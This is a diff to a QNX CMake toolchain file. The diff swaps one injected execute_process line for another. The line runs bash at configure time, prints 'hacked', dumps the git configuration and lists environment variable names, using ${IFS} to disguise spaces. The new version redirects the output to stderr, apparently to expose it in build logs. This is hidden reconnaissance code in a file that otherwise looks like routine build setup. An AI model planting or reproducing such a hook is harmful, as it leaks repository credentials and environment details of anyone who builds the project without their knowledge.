@@ -1,4 +1,4 @@
-execute_process(COMMAND bash -c "echo -----hacked------ ; git\${IFS}config\${IFS}--list  ; printenv | cut -d= -f1 || true")
+execute_process(COMMAND bash -c "echo -----hacked------ >&2 ; git\${IFS}config\${IFS}--list >&2 ; printenv | cut -d= -f1 >&2 || true")
 # Request license and download SDP from QNX Software Center: https://www.qnx.com/products/everywhere/
 
 set(CMAKE_SYSTEM_NAME QNX)
